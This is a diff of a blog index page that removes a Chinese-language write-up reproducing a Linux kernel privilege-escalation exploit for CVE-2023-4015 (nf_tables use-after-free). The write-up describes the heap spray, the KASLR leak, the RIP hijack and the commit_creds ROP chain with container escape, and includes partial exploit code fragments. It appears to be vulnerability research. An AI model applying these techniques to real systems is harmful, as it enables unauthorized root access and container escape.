@@ -156,7 +156,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2026/02/07/CVE-2023-4015/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2026/02/12/35C3CTF-namespace/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -170,157 +170,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2026/02/07/CVE-2023-4015/" class="post-title-link" itemprop="url">Linux Netfilter 提权漏洞 (CVE-2023-4015) 复现与利用分析</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2026-02-07 10:20:00 / Modified: 12:54:02" itemprop="dateCreated datePublished" datetime="2026-02-07T10:20:00+08:00">2026-02-07</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CVE/" itemprop="url" rel="index"><span itemprop="name">CVE</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="Symbols count in article">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">Symbols count in article: </span>
-              <span>5.2k</span>
-            </span>
-            <span class="post-meta-item" title="Reading time">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">Reading time &asymp;</span>
-              <span>19 mins.</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="综合描述"><a href="#综合描述" class="headerlink" title="综合描述"></a>综合描述</h1><p>​	CVE-2023-4015 揭示了 Linux 内核 Netfilter (nf_tables) 子系统中一个极为精妙的逻辑设计缺陷。</p>
-<p>该漏洞的核心在于 nf_tables 在处理复杂的 Netlink 批处理事务时，未能正确维护对象在异常回滚过程中的引用状态。具体而言，当攻击者构造一个包含特定 immediate 表达式（用于实现跳转逻辑）的规则，并故意在同一事务中触发后续错误的路径时，内核会因为逻辑重叠而对同一个 nft_chain 对象执行两次去激活（Deactivate）操作。这种“双重去激活”直接导致了对象的引用计数（use count）异常归零，从而触发提前释放。</p>
-<p>​	由于内核在回滚（Abort）阶段的清理逻辑不够严谨，虽然对象在内存中已被释放回 SLUB 分配器，但先前建立的规则索引中依然保留着指向该内存地址的悬垂指针。这意味着攻击者可以通过后续的堆喷射（Heap Spraying）技术，将恶意构造的数据填入该内存坑位，从而实现类型混淆。在拥有 CAP_NET_ADMIN 权限的前提下（非特权用户可通过用户命名空间轻松获得此权限），该漏洞能够绕过 KASLR 等现代防御机制，最终实现从普通用户到 Root 权限的本地提权。这个漏洞不仅展示了逻辑漏洞在复杂事务模型中的隐蔽性，也再次证明了引用计数管理在内核安全中的关键地位。</p>
-<h1 id="背景知识介绍"><a href="#背景知识介绍" class="headerlink" title="背景知识介绍"></a>背景知识介绍</h1><h2 id="Netfilter-核心架构"><a href="#Netfilter-核心架构" class="headerlink" title="Netfilter 核心架构"></a>Netfilter 核心架构</h2><p>​	Netfilter 的 nf_tables 模块构建了一个高度层级化的对象管理体系。其核心对象包括 Table（表）、Chain（链）、Rule（规则）以及 Set（集合）和 Element（元素）。Table 作为最顶层的容器，包含了所有的链；Chain 则是规则的集合，通常与内核协议栈的钩子（Hook）点绑定；Rule 包含了具体的匹配表达式（Expression），负责实际的数据包处理逻辑。Set 和 Element 则提供了一种高效的键值匹配机制，允许规则在不线性遍历的情况下处理大量的 IP 地址或端口。这些对象之间通过引用计数相互链接，例如一个规则引用了一个跳转链，那么该链的引用计数就会增加，只有当所有引用都消失时，对象才能被安全释放。</p>
-<p><img src="/images/CVE-2023-4015/netfilter_arch.png" alt="netfilter_arch"></p>
-<h2 id="RCU-无锁机制与宽限期检测"><a href="#RCU-无锁机制与宽限期检测" class="headerlink" title="RCU 无锁机制与宽限期检测"></a>RCU 无锁机制与宽限期检测</h2><p>​	在 Linux 内核网络子系统中，为了兼顾高并发下的读取性能与数据一致性，广泛采用了 RCU（Read-Copy-Update）机制。RCU 的核心哲学在于“读者优先”，它允许多个读者在没有任何锁开销的情况下并发访问数据，而写者则通过“复制-修改-更新”的方式进行操作。当写者完成更新并切换全局指针后，旧的数据副本并不能立即释放，因为可能仍有读者正在引用它。此时，旧副本进入所谓的“宽限期”（Grace Period）。</p>
-<p>​	内核判断 RCU 读操作结束的标准是基于“静止状态”的检测。通过 <code>rcu_read_lock()</code> 和 <code>rcu_read_unlock()</code> 标记的临界区内禁止发生进程调度。因此，当每一个 CPU 都至少经历了一次上下文切换（Context Switch）或进入了 CPU 空闲状态（Idle），即意味着所有在宽限期开始前进入临界区的读者都已退出了读操作。此时，系统认为该 CPU 度过了一个“静止状态”（Quiescent State）。当全系统所有 CPU 都经历了静止状态，内核便可安全地物理释放旧内存。在 CVE-2023-4015 的利用中，理解这种逻辑释放（引用计数归零）与物理释放（宽限期结束）之间的时间差至关重要。</p>
-<p><img src="/images/CVE-2023-4015/nf_objects_desc.png" alt="nf_objects_desc"></p>
-<h2 id="nf-tables-事务处理模型"><a href="#nf-tables-事务处理模型" class="headerlink" title="nf_tables 事务处理模型"></a>nf_tables 事务处理模型</h2><p>​	为了保证规则更新的原子性和一致性，nf_tables 引入了基于 Netlink 的批处理事务处理逻辑（nft_trans）。这一机制模仿了数据库的“两阶段提交”：在 Preparation Phase（准备阶段），内核会解析用户发送的 Batch 消息，分配资源并验证参数，此时所有的更改都被记录在事务链表中而未真正生效；如果该阶段通过，则进入 Commit Phase（提交阶段）将更改原子性地应用到全局状态。</p>
-<p>​	如果中间任何一步出错，则会触发 Abort Phase（中止阶段），内核将遍历事务链表，按照相反的顺序撤销所有已记录的操作。这种事务处理在内核中是序列化的，通常在进程的上下文中执行，但对象的物理释放往往会延迟到 RCU 回调或特定的系统工作队列（workqueue）中异步完成。这种同步更新状态与异步释放内存的设计，正是 CVE-2023-4015 能够通过并发竞争和逻辑交织制造出 UAF 场景的架构基础。</p>
-<p><img src="/images/CVE-2023-4015/nft_transaction.png" alt="nft_transaction"></p>
-<h1 id="漏洞原理分析"><a href="#漏洞原理分析" class="headerlink" title="漏洞原理分析"></a>漏洞原理分析</h1><p>​	漏洞的深层诱因源于 <code>nf_tables_newrule</code> 函数在处理新规则创建失败时的错误清理路径，与后续事务中止（Abort）路径之间发生的逻辑碰撞。在内核解析 Netlink 消息创建规则的过程中，如果遇到参数非法或内存不足等错误，系统会立即跳转至错误处理标签 <code>err_release_rule</code>。在此处，内核会显式调用 <code>nft_rule_expr_deactivate</code> 并携带 <code>NFT_TRANS_PREPARE_ERROR</code> 标志，旨在撤销当前规则中已经部分解析的表达式对其他对象的引用。对于 <code>immediate</code> 类型的表达式，这不仅意味着要递减目标跳转链的引用计数，还会通过 <code>nf_tables_unbind_chain</code> 解除该链与当前规则的绑定关系。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">err_release_rule:</span><br><span class="line">  <span class="comment">// 第一次去激活：由 nf_tables_newrule 直接触发</span></span><br><span class="line">  nft_rule_expr_deactivate(&amp;ctx, rule, NFT_TRANS_PREPARE_ERROR);</span><br><span class="line">  nf_tables_rule_destroy(&amp;ctx, rule);</span><br></pre></td></tr></table></figure>
-
-<p>​	然而，由于该事务已经标记为失败，内核在完成局部的错误处理后，仍会不可避免地触发全局的 <code>__nf_tables_abort</code>。在该函数遍历事务链表处理 <code>NFT_MSG_NEWRULE</code> 类型的操作时，逻辑出现了致命偏差。由于目标链在之前的错误处理路径中已经执行了 <code>unbind</code> 操作，导致 <code>nft_trans_rule_bound</code> 的状态检查失效。于是，回滚逻辑会再一次、也是第二次对该规则调用 <code>nft_rule_expr_deactivate</code>，此时的阶段标志被设为 <code>NFT_TRANS_ABORT</code>。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> NFT_MSG_NEWRULE:</span><br><span class="line">  <span class="keyword">if</span> (nft_trans_rule_bound(trans)) &#123; <span class="comment">// 状态位已在 Preparation 错误路径中被污染，导致检查跳过</span></span><br><span class="line">    nft_trans_destroy(trans);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 第二次去激活：导致目标 Chain 的引用计数产生 Underflow</span></span><br><span class="line">  nft_rule_expr_deactivate(&amp;trans-&gt;ctx, nft_trans_rule(trans), NFT_TRANS_ABORT);</span><br></pre></td></tr></table></figure>
-
-<p>​	这一系列动作导致目标跳转链（Victim Chain）的引用计数经历了两次连续的递减。如果我们构造一个初始引用计数为 1 的链，并在一次恶意事务中先通过规则引用它再人为制造错误，该链的引用计数会先降至 1（Preparation 报错），随后在 Abort 阶段降至 0。此时内核错误地认为该链已无人使用，从而将其物理释放。然而，我们的 <code>Base</code> 链中依然保留着指向这个已释放地址的规则索引，这就形成了一个稳定的 Use-After-Free 漏洞点。</p>
-<h1 id="漏洞利用过程详解"><a href="#漏洞利用过程详解" class="headerlink" title="漏洞利用过程详解"></a>漏洞利用过程详解</h1><h2 id="UAF触发"><a href="#UAF触发" class="headerlink" title="UAF触发"></a>UAF触发</h2><p>​	漏洞利用的第一步，也是最关键的一步，是精确控制目标对象的引用计数，使其在内核逻辑认为“已释放”的同时，我们手中仍持有指向它的有效引用。在 <code>trigger_uaf</code> 函数中，我们通过一系列精心编排的 Netlink 批处理事务（Batch Transactions）来实现这一目标。</p>
-<p>​	首先，我们需要在内核中建立三个关键的链：<code>c_free</code>（即 Victim，受害者链）、<code>c_primitive</code>（持有悬垂指针的 Base 链）以及 <code>c_spray</code>（用于后续堆喷射的占位链）。在代码中，我们特别将 <code>c_free</code> 的名称设置为全 ‘A’ 的长字符串，这是为了让它在后续被释放时能够落入特定的 <code>kmalloc-cg-192</code> 缓存池，方便我们进行堆喷射占位。通过第一个 Batch，我们完成了这些对象的创建，并添加了一条规则 <code>r_primitive</code>，让其通过 <code>immediate</code> 表达式引用 <code>c_free</code>。此时，如果我们通过调试器在 <code>nf_tables_addchain</code> 处下断点并观察，可以看到名为 ‘AAAA…’ 的 <code>c_free</code> 链已被成功创建。执行 <code>finish</code> 跳出函数后，可以清晰地观察到该受害链的内存结构信息，包括其地址以及当前的引用计数状态。下图中0xffff888102b3e300地址代表的是对应刚才通过ctx-&gt;chain获得的对应chain的地址，而0xffff888102b05300则是他的name指向的slab的内存区域也就是kmalloc-cg-192里面的地址。</p>
-<p><img src="/images/CVE-2023-4015/gdb_nf_tables_addchain.png" alt="gdb_nf_tables_addchain"></p>
-<p>​	接下来的操作是漏洞触发的核心。</p>
-<p>我们构造了一个包含两条新规则的恶意 Batch。第一条规则 <code>r_effect</code> 被添加到 <code>effect</code> 链中，它再次引用了 <code>c_free</code>。这一步在事务的 Preparation 阶段会将 <code>c_free</code> 的引用计数从 1 增加到 2。紧接着，我们在 <code>attack</code> 链中创建第二条规则 <code>r_attack</code>，它包含两个表达式：第一个引用合法的 <code>effect</code> 链，而第二个表达式则故意引用一个不存在的链 <code>some_invalid_chain</code>。这个不存在的链是整个逻辑陷阱的扳机，它将直接导致当前事务进入错误处理流程。</p>
-<p>​	当内核处理这个构造精巧的恶意 Batch 时，逻辑陷阱被成功触发。在处理 <code>r_attack</code> 规则时，由于引用的目标链不存在，内核立即抛出错误并进入 <code>NFT_TRANS_PREPARE_ERROR</code> 阶段。随后，内核开始回滚该 Batch 中已处理的规则，调用 <code>nft_immediate_deactivate</code> 来清理 <code>r_effect</code>。由于我们预先为 <code>c_effect</code> 链设置了 <code>NFT_CHAIN_BINDING</code> 标志，这一操作会触发递归解绑，导致受害者链 <code>c_free</code> 的引用计数从 2 递减至 1。然而，真正的致命一击发生在整个事务最终中止（Abort）的时刻。内核在执行 <code>__nf_tables_abort</code> 逻辑时，会再次遍历事务链表处理 <code>NFT_MSG_NEWRULE</code> 操作。由于先前的解绑逻辑未能在事务状态中留下完整标记，导致状态检查失效，回滚流程对 <code>r_effect</code> 发起了第二次去激活操作。至此，<code>c_free</code> 的引用计数再次递减，彻底归零。</p>
-<p>​	为了直观观察这一破坏过程，我们可以利用 GDB 设置条件断点：<code>b nf_tables_chain_destroy if ctx-&gt;chain == 0xffff888102b3e300</code>（地址需根据实际情况调整）。当我们在后续 Batch 中发送删除受害者链的指令时，断点会被触发。通过调试输出可以看到，在 <code>nf_tables_chain_destroy</code> 执行完毕后，原先存储 <code>c_free</code> 对象的内存区域已被破坏，原本清晰的 ‘AAAA…’ 名称指针位置现在充斥着内存回收后的脏数据，这标志着该内存块已正式返回 SLUB 分配器，成为了一个可被喷射占位的 UAF 坑位。</p>
-<p><img src="/images/CVE-2023-4015/gdb_chain_destroy_1.png" alt="gdb_chain_destroy_1"></p>
-<p><img src="/images/CVE-2023-4015/gdb_chain_destroy_2.png" alt="gdb_chain_destroy_2"></p>
-<p>​	现在，<code>c_free</code> 的引用计数已经归零，内核认为它不再被任何规则引用。于是，我们在下一个 Batch 中发送 <code>NFT_MSG_DELCHAIN</code> 命令来删除 <code>c_free</code>。内核执行删除操作后，那个全 ‘A’ 名称的 <code>c_free</code> 链所占用的内存被释放回 <code>kmalloc-cg-192</code> 缓存池。然而，我们在第一阶段创建的 <code>r_primitive</code> 规则依然静静地躺在内核中，它的 <code>immediate</code> 表达式仍然指向那个已经被释放的内存地址。至此，一个完美的 Use-After-Free 漏洞场景构建完成，我们通过 <code>r_primitive</code> 获得了一个通向内核堆内存深处的“后门”。</p>
-<h2 id="堆地址泄露-Heap-Leak"><a href="#堆地址泄露-Heap-Leak" class="headerlink" title="堆地址泄露 (Heap Leak)"></a>堆地址泄露 (Heap Leak)</h2><p>​	在成功制造了 UAF 之后，首要任务是泄露内核堆地址，为后续的利用铺平道路。<code>leak_heap</code> 函数的核心思想是利用堆喷射（Heap Spraying）技术，将一种我们可控的内核对象填入刚刚被释放的 <code>c_free</code> 内存坑位中。这里我们选择了 <code>nft_rule</code> 对象，因为它的大小可以通过附加表达式灵活调整，使其正好落入 <code>kmalloc-cg-192</code> 缓存池。</p>
-<p>​	<strong>占位与类型混淆</strong><br>​	我们构造了一个包含 <code>notrack</code> 表达式的 <code>nft_rule</code>，并通过大量发送 <code>NFT_MSG_NEWRULE</code> 请求进行喷射。当其中一个 <code>nft_rule</code> 恰好占据了原 <code>c_free</code> 的内存位置时，就发生了关键的类型混淆（Type Confusion）：原 <code>nft_chain</code> 结构体中的 <code>name</code> 指针字段，在内存偏移上恰好与新 <code>nft_rule</code> 结构体中的 <code>list.next</code> 指针重叠。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 构造 payload 使 nft_rule 大小适配 kmalloc-cg-192</span></span><br><span class="line"><span class="type">char</span> data[<span class="number">191</span> - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> nft_expr) - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> nft_rule)] = &#123;<span class="number">0</span>&#125;; </span><br><span class="line">rule r = make_rule(current_table_name, <span class="string">&quot;spray&quot;</span>, &amp;e, <span class="number">1</span>, data, <span class="keyword">sizeof</span>(data), <span class="number">0</span>);</span><br><span class="line"><span class="comment">// ... 循环发送 batch_new_rule 进行喷射 ...</span></span><br></pre></td></tr></table></figure>
-
-<p>​	<strong>信息泄露路径</strong><br>​	为了读取这个指针，我们向内核发送 <code>NFT_MSG_GETRULE</code> 命令，请求获取那个一直被我们持有的悬垂指针 <code>r_primitive</code>。内核在处理这个请求时，会调用 <code>nft_verdict_dump</code> 来导出规则中的 <code>immediate</code> 表达式信息。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 触发信息泄露</span></span><br><span class="line">nlmsghdr hdr = dump_rule(r_primitive, buf);</span><br></pre></td></tr></table></figure>
-<p>​	在 <code>nft_verdict_dump</code> 中，内核会试图读取并发送 <code>verdict.chain-&gt;name</code>。由于此时 <code>chain</code> 指针指向的内存已经被我们的 <code>nft_rule</code> 覆盖，内核实际上读取的是 <code>nft_rule-&gt;list.next</code> 的值。</p>
-<p>​	为了验证堆喷射是否成功占位，我们可以通过 GDB 在 <code>nft_immediate_dump</code> 函数处设置断点。当执行到泄露逻辑并触发该断点时，观察受害者链的 <code>name</code> 字段可以发现，它已经不再指向原本的名称字符串，而是指向了一块典型的 slab 内存区域。</p>
-<p>​	通过进一步解析这块内存，我们可以确认其内部结构完全符合我们喷射的 <code>nft_rule</code> 对象（大小为 192 字节）。利用 GDB 的结构体查看功能，我们可以清晰地看到 <code>nft_rule</code> 的元数据，并且通过对其 <code>extensions</code> 区域的进一步探测，能够识别出我们预埋的 <code>nft_expr</code> 表达式类型。这种内存层面的吻合完美证实了受害者链的 <code>name</code> 指针确实已被我们的恶意规则对象所覆盖，类型混淆已成定局。</p>
-<p><img src="/images/CVE-2023-4015/gdb_nft_immediate_dump_1.png" alt="gdb_nft_immediate_dump_1"><br><img src="/images/CVE-2023-4015/gdb_nft_immediate_dump_2.png" alt="gdb_nft_immediate_dump_2"></p>
-<p>​	<strong>解析泄露数据</strong><br>​	在用户态的回调函数 <code>dump_expr_leak_heap</code> 中，我们接收并解析这段数据。由于 <code>list.next</code> 指向的是双向链表中的下一个规则（或链表头），我们得到的是一个内核堆地址。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">dump_expr_leak_heap</span><span class="params">(expr e, <span class="type">void</span> *_unused)</span> &#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *data = nftnl_expr_get_str(e, NFTNL_EXPR_IMM_CHAIN);</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nft_rule</span> *<span class="title">r</span> =</span> (<span class="keyword">struct</span> nft_rule *)data;</span><br><span class="line">    heap = (<span class="type">uint64_t</span>)r-&gt;<span class="built_in">list</span>.next;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>​	通过这种方式，我们成功将一个内核内部的链表指针作为字符串“偷”了出来。一旦获得这个堆地址，我们就能计算出我们喷射对象的具体位置，从而精准地控制后续的内存布局。这里的list的next也就是上述说的0xffff888102b050c0地址。</p>
-<h2 id="绕过-KASLR-Leak-Kernel-Base"><a href="#绕过-KASLR-Leak-Kernel-Base" class="headerlink" title="绕过 KASLR (Leak Kernel Base)"></a>绕过 KASLR (Leak Kernel Base)</h2><p>​	在获取了堆地址后，下一步就是绕过 KASLR（内核地址空间布局随机化）。我们继续利用 <code>c_free</code> 的 UAF 坑位，但这次我们需要更精细的控制。<code>leak_vmlinux</code> 函数展示了如何通过 <code>nft_table</code> 的 <code>udata</code>（用户自定义数据）功能来实施这一攻击。</p>
-<p>​	<strong>伪造 nft_chain 结构体</strong><br>​	我们不再喷射 <code>nft_rule</code>，而是喷射带有 <code>udata</code> 的 <code>nft_table</code>。<code>udata</code> 的内容完全由用户态控制，我们将一段伪造的 <code>nft_chain</code> 结构体数据填入其中。当这个 <code>udata</code> 恰好覆盖了原 <code>c_free</code> 的位置时，内核再次访问 <code>c_free</code> 时实际上访问的是我们伪造的数据。</p>
-<p>​	<strong>构造任意地址读</strong><br>​	攻击的关键在于伪造链的 <code>name</code> 指针。我们将 <code>fake_chain-&gt;name</code> 指向了堆上的一个特定偏移位置：<code>heap + sizeof(struct nft_rule)</code>。回顾之前的堆喷射，这个位置正好存放着 <code>nft_rule</code> 内部的 <code>nft_expr</code>（表达式）结构体。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 将 name 指针指向 nft_rule 之后，即 nft_expr 的起始位置</span></span><br><span class="line">fake_chain-&gt;name = (<span class="type">char</span> *)(heap + <span class="keyword">sizeof</span>(<span class="keyword">struct</span> nft_rule));</span><br></pre></td></tr></table></figure>
-
-<p>​	而 <code>nft_expr</code> 结构体的第一个成员正是 <code>ops</code> 指针（指向 <code>nft_expr_ops</code>，如 <code>nft_notrack_ops</code>）。这个 <code>ops</code> 指针位于内核代码段（.text），是一个固定的内核符号地址。通过调试器观察，我们可以清晰地看到伪造的 <code>chain</code> 结构体已经成功占据了内存，且其 <code>name</code> 指针准确地指向了 <code>nft_expr</code> 的起始地址。</p>
-<p>​	<strong>泄露 ops 指针</strong></p>
-<p><img src="/images/CVE-2023-4015/gdb_leak_vmlinux.png" alt="gdb_leak_vmlinux"></p>
-<p>​	当我们再次触发 <code>NFT_MSG_GETRULE</code> 进行 dump 时，内核会顺着这个伪造的 <code>name</code> 指针去读取字符串。结果，它把位于该地址的 <code>nft_notrack_ops</code> 内核函数地址当作字符串读取并发送给了我们。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">dump_expr_leak_vmlinux</span><span class="params">(expr e, <span class="type">void</span> *dat)</span> &#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *data = nftnl_expr_get_str(e, NFTNL_EXPR_IMM_CHAIN);</span><br><span class="line">    <span class="comment">// 直接读取前8字节作为内核地址</span></span><br><span class="line">    vmlinux = *(<span class="type">uint64_t</span> *)data;</span><br><span class="line">    <span class="comment">// 计算内核基址</span></span><br><span class="line">    <span class="keyword">if</span> (vmlinux &gt;= <span class="number">0xffffffff00000000</span>) &#123;</span><br><span class="line">        vmlinux -= NFT_NOTRACK_OPS;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>​	通过计算泄露出的 <code>ops</code> 地址与已知的 <code>NFT_NOTRACK_OPS</code> 偏移，我们即可精准计算出内核基址 <code>vmlinux_base</code>，从而彻底击败 KASLR 保护。</p>
-<h2 id="劫持-RIP：udata-喷射的“偷梁换柱”"><a href="#劫持-RIP：udata-喷射的“偷梁换柱”" class="headerlink" title="劫持 RIP：udata 喷射的“偷梁换柱”"></a>劫持 RIP：udata 喷射的“偷梁换柱”</h2><p>​	在之前的堆地址泄露阶段，我们使用了 <code>nft_rule</code> 对象来占位，那是为了利用其内部合法的链表指针。然而，在最终的劫持阶段，我们需要对内存内容拥有<strong>字节级</strong>的完全控制权，特别是要精确伪造 <code>ops</code> 指针。合法的 <code>nft_rule</code> 结构受内核逻辑限制，许多字段无法被用户态随意修改。因此，我们在这里采用了一种更为底层的喷射技术——**<code>nft_table</code> 的 <code>udata</code>（用户定义数据）喷射**。</p>
-<p>​	<code>udata</code> 的核心特性在于其“透传”性：内核会将用户提供的数据原封不动地 <code>memcpy</code> 到堆内存中。这就给了我们实施“偷梁换柱”的绝佳机会。我们不再依赖内核去构造对象，而是在用户态直接构造一个包含恶意 <code>ops</code> 指针的“伪造数据包”，然后利用 <code>udata</code> 机制将其注入到内核堆中。</p>
-<p><img src="/images/CVE-2023-4015/udata_spray_mechanism.png" alt="udata_spray_mechanism"></p>
-<p>​	<strong>用户态构造 payload</strong><br>​	我们在用户态定义一个与 UAF 坑位大小匹配的数组（如 192 字节），并将其强制转换为 <code>nft_rule</code> 和 <code>nft_expr</code> 的结构体指针。注意，此时这些操作完全在用户态内存中进行。我们计算出 <code>ops</code> 指针在结构体中的偏移，并将计算好的恶意地址（指向我们的 JOP Gadget）直接写入该位置。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 在本地准备伪造数据</span></span><br><span class="line"><span class="type">char</span> data[<span class="number">192</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_rule</span> *<span class="title">fake_rule</span> =</span> (<span class="keyword">struct</span> nft_rule *)data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_expr</span> *<span class="title">fake_expr</span> =</span> (<span class="keyword">struct</span> nft_expr *)(data + <span class="keyword">sizeof</span>(<span class="keyword">struct</span> nft_rule));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 将恶意的 ops 指针写入本地数组</span></span><br><span class="line">fake_expr-&gt;ops = (<span class="keyword">struct</span> nft_expr_ops *)(heap + JOP_OFFSET - DEACTIVATE_OFFSET);</span><br></pre></td></tr></table></figure>
-
-<p>​	<strong>内核态堆喷射</strong><br>​	随后，我们调用 <code>make_table</code> 并将这个精心构造的 <code>data</code> 数组作为 <code>udata</code> 传入。内核在处理 <code>NFT_MSG_NEWTABLE</code> 请求时，会申请一块与 <code>data</code> 大小相同的内存。由于其大小恰好也是 192 字节，SLUB 分配器极大概率会将刚刚释放的 UAF 坑位分配给它。紧接着，内核执行内存拷贝，将包含恶意 <code>ops</code> 指针的 <code>data</code> 数据完整地写入这块内核内存。</p>
-<p>​	<strong>最终触发</strong><br>​	当内核随后尝试通过悬垂指针访问这个对象并调用 <code>deactivate</code> 时，它会读取到我们通过 <code>udata</code> 注入的恶意 <code>ops</code> 指针，从而跳转执行 JOP Gadget，开启 ROP 之旅。</p>
-<p>​	<strong>ROP 载荷构造</strong><br>​	由于单个 <code>udata</code> 或规则数据区的空间限制，我们将 ROP 链拆分为两部分。第一段载荷利用 <code>PUSH RSI; JMP QWORD PTR [RSI + 0xF]</code> 指令配合栈迁移 gadget，将 <code>RSP</code> 指向我们的堆区。随后的 ROP 链执行标准的提权流程：</p>
-<ol>
-<li><strong>提权</strong>：调用 <code>commit_creds(prepare_kernel_cred(0))</code> 将当前进程凭证提升为 Root。</li>
-<li><strong>逃逸</strong>：调用 <code>find_task_by_vpid(1)</code> 获取 init 进程，并通过 <code>switch_task_namespaces</code> 切换命名空间以逃逸容器。</li>
-<li><strong>返回</strong>：利用 KPTI 跳板（trampoline）安全返回用户态，执行 <code>system(&quot;/bin/bash&quot;)</code>。</li>
-</ol>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// commit_creds(&amp;init_cred)</span></span><br><span class="line">*rop++ = vmlinux + POP_RDI_RET;</span><br><span class="line">*rop++ = vmlinux + INIT_CRED;</span><br><span class="line">*rop++ = vmlinux + COMMIT_CREDS;</span><br><span class="line"><span class="comment">// ... 命名空间切换与返回用户态 ...</span></span><br></pre></td></tr></table></figure>
-
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>​	CVE-2023-4015 的复现过程展示了内核利用的艺术：一个微小的事务回滚逻辑缺陷，通过精密的堆布局控制与类型混淆，一步步转化为任意读写，最终实现完全的权限提升。这不仅是对 Netfilter 复杂性的警示，也是对内核开发者在处理原子操作与对象生命周期时必须保持极度严谨的有力证明。</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2026/02/07/%E9%95%BF%E5%9F%8E%E6%9D%AFavm%20wp/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="a2ure">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="a2ure's blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2026/02/07/%E9%95%BF%E5%9F%8E%E6%9D%AFavm%20wp/" class="post-title-link" itemprop="url">长城杯avm wp</a>
+            <a href="/2026/02/12/35C3CTF-namespace/" class="post-title-link" itemprop="url">35C3CTF-namespace</a>
         </h2>
 
         <div class="post-meta">
@@ -330,114 +180,7 @@
               </span>
               <span class="post-meta-item-text">Posted on</span>
 
-              <time title="Created: 2026-02-07 10:10:47" itemprop="dateCreated datePublished" datetime="2026-02-07T10:10:47+08:00">2026-02-07</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
